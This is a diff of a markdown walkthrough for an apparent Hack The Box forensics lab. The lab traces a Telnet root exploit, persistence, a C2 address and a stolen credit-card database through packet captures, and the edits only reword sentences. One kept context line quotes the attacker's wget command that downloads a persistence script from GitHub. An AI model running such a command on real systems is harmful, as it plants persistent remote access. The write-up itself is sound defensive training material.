@@ -32,7 +32,7 @@ Answer: ```CVE-2026-24061```
 
 # Task 2: When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?
 
-Right-clicking packet number 25 and selecting ```Follow > TCP Stream``` should allow us to see the entire conversation between the attacker and the system:
+Right-click packet 25 and select ```Follow > TCP Stream``` to reconstruct the full Telnet session between the attacker and the server.
 
 ![firstexploit.png](/TellyHTB/screenshots/firstexploit1.png)
 
@@ -68,7 +68,7 @@ Answer: ```wget https://raw.githubusercontent.com/montysecurity/linper/refs/head
 
 # Task 6: The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
 
-> A Command and Control (C2) IP address is a malicious address used by threat actors to manage compromised systems and steal data. These IPs are dynamic, often utilizing proxies or redirectors to evade detection. 
+> A Command and Control (C2) IP address is a malicious address used by threat actors to control compromised systems and steal data. These IPs are dynamic, often utilizing proxies or redirectors to evade detection. 
 
 ![c2ipaddress.png](/TellyHTB/screenshots/c2ipaddress.png)
 
@@ -87,8 +87,7 @@ Let's export the database from Wireshark:
 ![exportobjects.png](/TellyHTB/screenshots/exportobjects.png)
 ![savedb.png](/TellyHTB/screenshots/savedb.png)
 
-Now, let's access our downloaded database using ```sqlite3```.
-
+The exported file is a SQLite database, which we can inspect using ```sqlite3```.
 ```bash
 sqlite3 credit-cards-25-blackfriday.db
 ```
